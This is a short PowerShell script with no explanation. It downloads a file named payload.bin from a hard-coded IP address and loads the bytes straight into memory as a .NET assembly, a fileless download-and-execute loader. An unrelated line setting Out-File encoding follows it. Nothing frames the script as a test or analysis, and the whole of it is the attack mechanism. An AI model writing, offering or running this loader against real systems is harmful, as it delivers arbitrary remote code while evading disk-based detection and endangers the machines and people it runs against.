[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://198.51.100.16/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($RemoteUrl)
[Reflection.Assembly]::Load($ManagedBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
